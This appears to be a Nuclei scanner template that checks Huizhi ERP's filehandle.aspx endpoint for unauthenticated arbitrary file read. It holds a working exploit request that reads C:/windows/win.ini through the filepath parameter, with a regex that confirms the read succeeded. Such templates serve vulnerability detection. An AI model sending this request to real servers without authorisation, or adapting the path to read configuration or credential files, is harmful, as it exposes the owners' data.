id: huizhierp-filehandle-lfi
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 汇智ERP filehandle.aspx 接口处任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露，导致系统处于极不安全的状态。
  reference:
    - https://github.com/wy876/POC/blob/main/%E6%B1%87%E6%99%BAERP%E6%8E%A5%E5%8F%A3filehandle.aspx%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - method: GET
    path:
      - "{{BaseURL}}/nssys/common/filehandle.aspx?filepath=C%3a%2fwindows%2fwin%2eini"
    matchers:
      - type: regex
        part: body
        regex:
          - "\\[(font|extension|file)s\\]"